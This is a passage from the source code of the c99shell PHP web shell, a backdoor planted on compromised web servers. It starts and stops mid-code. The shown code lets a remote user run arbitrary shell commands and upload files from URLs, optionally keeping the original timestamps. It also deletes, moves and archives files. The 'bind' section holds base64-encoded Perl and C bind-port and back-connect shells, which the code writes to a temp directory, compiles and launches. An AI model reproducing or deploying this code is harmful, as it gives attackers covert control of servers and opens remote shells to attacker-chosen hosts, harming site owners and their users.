value=1".($perms["g"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"")."&gt;eXecute&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;World&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"")."&gt;eXecute&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=submit name=chmod_submit value=\"Save\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;";
  }
 }
}
if ($act == "upload")
{
 $uploadmess = "";
 $uploadpath = str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath);
 if (empty($uploadpath)) {$uploadpath = $d;}
 elseif (substr($uploadpath,-1,1) != "/") {$uploadpath .= "/";}
 if (!empty($submit))
 {
  global $HTTP_POST_FILES;
  $uploadfile = $HTTP_POST_FILES["uploadfile"];
  if (!empty($uploadfile["tmp_name"]))
  {
   if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
   else {$destin = $userfilename;}
   if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!&lt;br&gt;";}
  }
  elseif (!empty($uploadurl))
  {
   if (!empty($uploadfilename)) {$destin = $uploadfilename;}
   else
   {
    $destin = explode("/",$destin);
    $destin = $destin[count($destin)-1];
    if (empty($destin))
    {
     $i = 0;
     $b = "";
     while(file_exists($uploadpath.$destin)) {if ($i &gt; 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
   }
   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "&lt;b&gt;Incorect url!&lt;/b&gt;&lt;br&gt;";}
   else
   {
    $st = getmicrotime();
    $content = @file_get_contents($uploadurl);
    $dt = round(getmicrotime()-$st,4);
    if (!$content) {$uploadmess .=  "Can't download file!&lt;br&gt;";}
    else
    {
     if ($filestealth) {$stat = stat($uploadpath.$destin);}
     $fp = fopen($uploadpath.$destin,"w");
     if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!&lt;br&gt;";}
     else
     {
      fwrite($fp,$content,strlen($content));
      fclose($fp);
      if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}
     }
    }
   }
  }
 }
 if ($miniform)
 {
  echo "&lt;b&gt;".$uploadmess."&lt;/b&gt;";
  $act = "ls";
 }
 else
 {
  echo "&lt;b&gt;File upload:&lt;/b&gt;&lt;br&gt;&lt;b&gt;".$uploadmess."&lt;/b&gt;&lt;form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=\"POST\"&gt;
Select file on your local computer: &lt;input name=\"uploadfile\" type=\"file\"&gt;&lt;br&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or&lt;br&gt;
Input URL: &lt;input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"&gt;&lt;br&gt;&lt;br&gt;
Save this file dir: &lt;input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;
File-name (auto-fill): &lt;input name=uploadfilename size=25&gt;&lt;br&gt;&lt;br&gt;
&lt;input type=checkbox name=uploadautoname value=1 id=df4&gt;&nbsp;convert file name to lovercase&lt;br&gt;&lt;br&gt;
&lt;input type=\"submit\" name=\"submit\" value=\"Upload\"&gt;
&lt;/form&gt;";
 }
}
if ($act == "delete")
{
 $delerr = "";
 foreach ($actbox as $v)
 {
  $result = false;
  $result = fs_rmobj($v);
  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."&lt;br&gt;";}
 }
 if (!empty($delerr)) {echo "&lt;b&gt;Deleting with errors:&lt;/b&gt;&lt;br&gt;".$delerr;}
 $act = "ls";
}
if (!$usefsbuff)
{
 if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "&lt;center&gt;&lt;b&gt;Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.&lt;/center&gt;";}
}
else
{
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; }
 elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
 elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=&gt;$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=&gt;$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=&gt;$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!&lt;br&gt;";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=&gt;$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!&lt;br&gt;";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "&lt;b&gt;Pasting with errors:&lt;/b&gt;&lt;br&gt;".$psterr;}
  $act = "ls";
 }
 elseif ($actarcbuff)
 {
  $arcerr = "";
  if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
  else {$ext = ".tar.gz";}
  if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
  $cmdline .= " ".$actarcbuff_path;
  $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
  foreach($objects as $v)
  {
   $v = str_replace("\\",DIRECTORY_SEPARATOR,$v);
   if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
   if (is_dir($v))
   {
    if (substr($v,-1,1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
    $v .= "*";
   }
   $cmdline .= " ".$v;
  }
  $tmp = realpath(".");
  chdir($d);
  $ret = myshellexec($cmdline);
  chdir($tmp);
  if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!&lt;br&gt;";}
  $ret = str_replace("\r\n","\n",$ret);
  $ret = explode("\n",$ret);
  if ($copy_unset) {foreach($sess_data["copy"] as $k=&gt;$v) {unset($sess_data["copy"][$k]);}}
  foreach($sess_data["cut"] as $k=&gt;$v)
  {
   if (in_array($v,$ret)) {fs_rmobj($v);}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($arcerr)) {echo "&lt;b&gt;Archivation errors:&lt;/b&gt;&lt;br&gt;".$arcerr;}
  $act = "ls";
 }
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=&gt;$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!&lt;br&gt;";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=&gt;$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!&lt;br&gt;";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "&lt;b&gt;Pasting with errors:&lt;/b&gt;&lt;br&gt;".$psterr;}
  $act = "ls";
 }
}
if ($act == "cmd")
{
if (trim($cmd) == "ps -aux") {$act = "ps_aux";}
else
{
 @chdir($chdir);
 if (!empty($submit))
 {
  echo "&lt;b&gt;Result of execution this command&lt;/b&gt;:&lt;br&gt;";
  $olddir = realpath(".");
  @chdir($d);
  $ret = myshellexec($cmd);
  $ret = convert_cyr_string($ret,"d","w");
  if ($cmd_txt)
  {
   $rows = count(explode("\r\n",$ret))+1;
   if ($rows &lt; 10) {$rows = 10;}
   echo "&lt;br&gt;&lt;textarea cols=\"122\" rows=\"".$rows."\" readonly&gt;".htmlspecialchars($ret)."&lt;/textarea&gt;";
  }
  else {echo $ret."&lt;br&gt;";}
  @chdir($olddir);
 }
 else {echo "&lt;b&gt;Execution command&lt;/b&gt;"; if (empty($cmd_txt)) {$cmd_txt = true;}}
 echo "&lt;form action=\"".$surl."act=cmd\" method=\"POST\"&gt;&lt;textarea name=\"cmd\" cols=\"122\" rows=\"10\"&gt;".htmlspecialchars($cmd)."&lt;/textarea&gt;&lt;input type=\"hidden\" name=\"d\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Execute\"&gt;&nbsp;Display in text-area&nbsp;&lt;input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "&gt;&lt;/form&gt;";
}
}
if ($act == "ls")
{
 if (count($ls_arr) &gt; 0) {$list = $ls_arr;}
 else
 {
  $list = array();
  if ($h = @opendir($d))
  {
   while (($o = readdir($h)) !== false) {$list[] = $d.$o;}
   closedir($h);
  }
 }
 if (count($list) == 0) {echo "&lt;center&gt;&lt;b&gt;Can't open directory (".htmlspecialchars($d).")!&lt;/b&gt;&lt;/center&gt;";}
 else
 {
  //Building array
  $objects = array();
  $vd = "f"; //Viewing mode
  if ($vd == "f")
  {
   $objects["head"] = array();
   $objects["dirs"] = array();
   $objects["links"] = array();
   $objects["files"] = array();
   foreach ($list as $v)
   {
    $o = basename($v);
    $row = array();
    if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";}
    elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";}
    elseif (is_dir($v))
    {
     if (is_link($v)) {$type = "LINK";}
     else {$type = "DIR";}
     $row[] = $v;
     $row[] = $type;
    }
    elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}
    $row[] = filemtime($v);
    if (!$win)
    {
     $ow = @posix_getpwuid(fileowner($v));
     $gr = @posix_getgrgid(filegroup($v));
     $row[] = $ow["name"]."/".$gr["name"];
     $row[] = fileowner($v)."/".filegroup($v);
    }
    $row[] = fileperms($v);
    if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
    elseif (is_link($v)) {$objects["links"][] = $row;}
    elseif (is_dir($v)) {$objects["dirs"][] = $row;}
    elseif (is_file($v)) {$objects["files"][] = $row;}
   }
   $row = array();
   $row[] = "&lt;b&gt;Name&lt;/b&gt;";
   $row[] = "&lt;b&gt;Size&lt;/b&gt;";
   $row[] = "&lt;b&gt;Modify&lt;/b&gt;";
   if (!$win)
  {$row[] = "&lt;b&gt;Owner/Group&lt;/b&gt;";}
   $row[] = "&lt;b&gt;Perms&lt;/b&gt;";
   $row[] = "&lt;b&gt;Action&lt;/b&gt;";
   $k = $sort[0];
   if (!is_numeric($k)) {$k = $sort[0] = 0;}
   if ($sort[1] != "a") {$sort[1] = "d";}
   $y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($sort[1] == "a"?"d":"a")."\"&gt;";
   $y .= "&lt;img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($sort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"&gt;&lt;/a&gt;";
   $row[$k] .= $y;
   for($i=0;$i&lt;count($row)-1;$i++)
   {
    if ($i != $k) {$row[$i] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$sort[1]."\"&gt;".$row[$i]."&lt;/a&gt;";}
   }
   $v = $sort[0];
   usort($objects["dirs"], "tabsort");
   usort($objects["links"], "tabsort");
   usort($objects["files"], "tabsort");
   if ($sort[1] == "d")
   {
    $objects["dirs"] = array_reverse($objects[dirs]);
    $objects["files"] = array_reverse($objects[files]);
   }
   $objects = array_merge($objects["head"],$objects["dirs"],$objects["links"],$objects["files"]);
   $tab = array();
   $tab["cols"] = array($row);
   $tab["head"] = array();
   $tab["dirs"] = array();
   $tab["links"] = array();
   $tab["files"] = array();
   foreach ($objects as $a)
   {
    $v = $a[0];
    $o = basename($v);
    $dir = dirname($v);
    if ($disp_fullpath) {$disppath = $v;}
    else {$disppath = $o;}
    $disppath = str2mini($disppath,60);
    if (in_array($v,$sess_data["cut"])) {$disppath = "&lt;strike&gt;".$disppath."&lt;/strike&gt;";}
    elseif (in_array($v,$sess_data["copy"])) {$disppath = "&lt;u&gt;".$disppath."&lt;/u&gt;";}
    foreach ($regxp_highlight as $r)
    {
     if (ereg($r[0],$o))
     {
      if ((!is_numeric($r[1])) or ($r[1] &gt; 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command"; exit;}
      else
      {
       $r[1] = round($r[1]);
       $isdir = is_dir($v);
       if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir))
       {
        if (empty($r[2])) {$r[2] = "&lt;b&gt;"; $r[3] = "&lt;/b&gt;";}
        $disppath = $r[2].$disppath.$r[3];
        if ($r[4]) {break;}
       }
      }
     }
    }
    $uo = urlencode($o);
    $ud = urlencode($dir);
    $uv = urlencode($v);
    $row = array();
    if ($o == ".")
    {
     $row[] = "&lt;img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."\"&gt;".$o."&lt;/a&gt;";
     $row[] = "LINK";
    }
    elseif ($o == "..")
    {
     $row[] = "&lt;img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"19\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"&gt;".$o."&lt;/a&gt;";
     $row[] = "LINK";
    }
    elseif (is_dir($v))
    {
     if (is_link($v))
     {
      $disppath .= " =&gt; ".readlink($v);
      $type = "LINK";
      $row[] =  "&lt;img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"16\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"&gt;[".$disppath."]&lt;/a&gt;";
     }
     else
     {
      $type = "DIR";
      $row[] =  "&lt;img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"&gt;[".$disppath."]&lt;/a&gt;";
      }
     $row[] = $type;
    }
    elseif(is_file($v))
    {
     $ext = explode(".",$o);
     $c = count($ext)-1;
     $ext = $ext[$c];
     $ext = strtolower($ext);
     $row[] =  "&lt;img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\"&gt;&nbsp;&lt;a href=\"".$surl."act=f&f=".$uo."&d=".$ud."&\"&gt;".$disppath."&lt;/a&gt;";
     $row[] = view_size($a[1]);
    }
    $row[] = date("d.m.Y H:i:s",$a[2]);
    if (!$win) {$row[] = $a[3];}
    $row[] = "&lt;a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"&gt;&lt;b&gt;".view_perms_color($v)."&lt;/b&gt;&lt;/a&gt;";
    if (is_dir($v)) {$row[] = "&lt;a href=\"".$surl."act=d&d=".$uv."\"&gt;&lt;img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;input type=\"checkbox\" name=\"actbox[]\" value=\"".htmlspecialchars($v)."\"&gt;";}
    else {$row[] = "&lt;a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"&gt;&lt;img src=\"".$surl."act=img&img=download\" alt=\"Download\" height=\"16\" width=\"19\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;input type=\"checkbox\" id=\"ls_dir[]\" name=\"actbox[]\" value=\"".htmlspecialchars($v)."\"&gt;";}
    if (($o == ".") or ($o == "..")) {$tab[head][] = $row;}
    elseif (is_link($v)) {$tab["links"][] = $row;}
    elseif (is_dir($v)) {$tab["dirs"][] = $row;}
    elseif (is_file($v)) {$tab["files"][] = $row;}
   }
  }
  //Compiling table
  $table = array_merge($tab["cols"],$tab["head"],$tab["dirs"],$tab["links"],$tab["files"]);
  echo "&lt;center&gt;&lt;b&gt;Listing directory (".count($tab["files"])." files and ".(count($tab["dirs"])+count($tab["links"]))." directories):&lt;/b&gt;&lt;/center&gt;&lt;br&gt;&lt;TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#333333 border=0&gt;&lt;form method=\"POST\"&gt;";
  foreach($table as $row)
  {
   echo "&lt;tr&gt;\r\n";
   foreach($row as $v) {echo "&lt;td&gt;".$v."&lt;/td&gt;\r\n";}
   echo "&lt;/tr&gt;\r\n";
  }
  echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"right\"&gt;&lt;b&gt;&lt;img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"&gt;";
  if (count(array_merge($sess_data["copy"],$sess_data["cut"])) &gt; 0 and ($usefsbuff))
  {
   echo "&lt;input type=\"submit\" name=\"actarcbuff\" value=\"Pack buffer to archive\"&gt;&nbsp;&lt;input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=\"submit\" name=\"actpastebuff\" value=\"Paste\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=\"submit\" name=\"actemptybuff\" value=\"Empty buffer\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
  }
  echo "&lt;select name=\"act\"&gt;&lt;option value=\"".$act."\"&gt;With selected:&lt;/option&gt;";
  echo "&lt;option value=\"delete\"".gchds($dspact,"delete"," selected")."&gt;Delete&lt;/option&gt;";
  echo "&lt;option value=\"chmod\"".gchds($dspact,"chmod"," selected")."&gt;Change-mode&lt;/option&gt;";
  if ($usefsbuff)
  {
   echo "&lt;option value=\"cut\"".gchds($dspact,"cut"," selected")."&gt;Cut&lt;/option&gt;";
   echo "&lt;option value=\"copy\"".gchds($dspact,"copy"," selected")."&gt;Copy&lt;/option&gt;";
   echo "&lt;option value=\"unselect\"".gchds($dspact,"unselect"," selected")."&gt;Unselect&lt;/option&gt;";
  }
  echo "&lt;/select&gt;&nbsp;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/p&gt;";
  echo "&lt;/form&gt;";
 }
}
if ($act == "bind")
{
 $bndsrcs = array(
"c99sh_bindport.pl"=&gt;
"IyEvdXNyL2Jpbi9wZXJsDQppZiAoQEFSR1YgPCAxKSB7ZXhpdCgxKTt9DQokcG9ydCA9ICRBUkdW".
"WzBdOw0KZXhpdCBpZiBmb3JrOw0KJDAgPSAidXBkYXRlZGIiIC4gIiAiIHgxMDA7DQokU0lHe0NI".
"TER9ID0gJ0lHTk9SRSc7DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsIFBGX0lORVQsIFNPQ0tfU1RS".
"RUFNLCAwKTsNCnNldHNvY2tvcHQoUywgU09MX1NPQ0tFVCwgU09fUkVVU0VBRERSLCAxKTsNCmJp".
"bmQoUywgc29ja2FkZHJfaW4oJHBvcnQsIElOQUREUl9BTlkpKTsNCmxpc3RlbihTLCA1MCk7DQph".
"Y2NlcHQoWCxTKTsNCm9wZW4gU1RESU4sICI8JlgiOw0Kb3BlbiBTVERPVVQsICI+JlgiOw0Kb3Bl".
"biBTVERFUlIsICI+JlgiOw0KZXhlYygiZWNobyBcIldlbGNvbWUgdG8gYzk5c2hlbGwhXHJcblxy".
"XG5cIiIpOw0Kd2hpbGUoMSkNCnsNCiBhY2NlcHQoWCwgUyk7DQogdW5sZXNzKGZvcmspDQogew0K".
"ICBvcGVuIFNURElOLCAiPCZYIjsNCiAgb3BlbiBTVERPVVQsICI+JlgiOw0KICBjbG9zZSBYOw0K".
"ICBleGVjKCIvYmluL3NoIik7DQogfQ0KIGNsb3NlIFg7DQp9",
"c99sh_bindport.c"=&gt;
"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5".
"cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4N".
"CiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50IGFyZ2M7DQpjaGFy".
"ICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1".
"Y3Qgc29ja2FkZHJfaW4gcmVtb3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5f".
"ZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9pKGFyZ3ZbMV0p".
"KTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tm".
"ZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigi".
"c29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmcmVtb3Rl".
"LCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1h".
"Y2NlcHQoc29ja2ZkLDAsMCk7DQogICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsN".
"CiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk7DQogICBy".
"ZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1Zikp".
"DQogICBzeXN0ZW0oImVjaG8gd2VsY29tZSB0byBjOTlzaGVsbCAmJiAvYmluL2Jhc2ggLWkiKTsN".
"CiAgIGVsc2UNCiAgIGZwcmludGYoc3RkZXJyLCJTb3JyeSIpOw0KICAgY2xvc2UobmV3ZmQpOw0K".
"ICB9DQogfQ0KfQ0KaW50IGNocGFzcyhjaGFyICpiYXNlLCBjaGFyICplbnRlcmVkKSB7DQppbnQg".
"aTsNCmZvcihpPTA7aTxzdHJsZW4oZW50ZXJlZCk7aSsrKSANCnsNCmlmKGVudGVyZWRbaV0gPT0g".
"J1xuJykNCmVudGVyZWRbaV0gPSAnXDAnOyANCmlmKGVudGVyZWRbaV0gPT0gJ1xyJykNCmVudGVy".
"ZWRbaV0gPSAnXDAnOw0KfQ0KaWYgKCFzdHJjbXAoYmFzZSxlbnRlcmVkKSkNCnJldHVybiAwOw0K".
"fQ==",
"c99sh_backconn.pl"=&gt;
"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ".
"HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZ".
"DsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJ".
"HRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0L".
"CAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgnd".
"GNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBka".
"WUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yO".
"iAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLR".
"VQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlK".
"FNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==",
"c99sh_backconn.c"=&gt;
"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5l".
"dGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZk".
"Ow0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJybSAtZiAiOyANCiBk".
"YWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0g".
"aHRvbnMoYXRvaShhcmd2WzJdKSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihh".
"cmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJsZW4oYXJndlsy".
"XSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsg".
"DQogaWYgKChjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1".
"Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7DQogICBleGl0".
"KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIo".
"ZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwi".
"c2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=="
);
 $bndportsrcs = array(
"c99sh_bindport.pl"=&gt;array("Using PERL","perl %path %port"),
"c99sh_bindport.c"=&gt;array("Using C","%path %port %pass")
);
 $bcsrcs = array(
"c99sh_backconn.pl"=&gt;array("Using PERL","perl %path %host %port"),
"c99sh_backconn.c"=&gt;array("Using C","%path %host %port")
);
 if ($win) {echo "&lt;b&gt;Binding port and Back connect:&lt;/b&gt;&lt;br&gt;This functions not work in Windows!&lt;br&gt;&lt;br&gt;";}
 else
 {
  if (!is_array($bind)) {$bind = array();}
  if (!is_array($bc)) {$bc = array();}
  if (!is_numeric($bind["port"])) {$bind["port"] = $bindport_port;}
  if (empty($bind["pass"])) {$bind["pass"] = $bindport_pass;}
  if (empty($bc["host"])) {$bc["host"] = $REMOTE_ADDR;}
  if (!is_numeric($bc["port"])) {$bc["port"] = $bindport_port;}
  if (!empty($bindsubmit))
  {
   echo "&lt;b&gt;Result of binding port:&lt;/b&gt;&lt;br&gt;";
   $v = $bndportsrcs[$bind["src"]];
   if (empty($v)) {echo "Unknown file!&lt;br&gt;";}
   elseif (fsockopen($SERVER_ADDR,$bind["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!&lt;br&gt;";}
   else
   {
    $srcpath = $tmpdir.$bind["src"];
    $w = explode(".",$bind["src"]);
    $ext = $w[count($w)-1];
    unset($w[count($w)-1]);
    $binpath = $tmpdir.join(".",$w);
    if ($ext == "pl") {$binpath = $srcpath;}
    @unlink($srcpath);
    $fp = fopen($srcpath,"ab+");
    if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!&lt;br&gt;";}
    else
    {
     $data = base64_decode($bndsrcs[$bind["src"]]);
     fwrite($fp,$data,strlen($data));
     fclose($fp);
     if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath);  @unlink($srcpath);}
     $v[1] = str_replace("%path",$binpath,$v[1]);
     $v[1] = str_replace("%port",$bind["port"],$v[1]);
     $v[1] = str_replace("%pass",$bind["pass"],$v[1]);
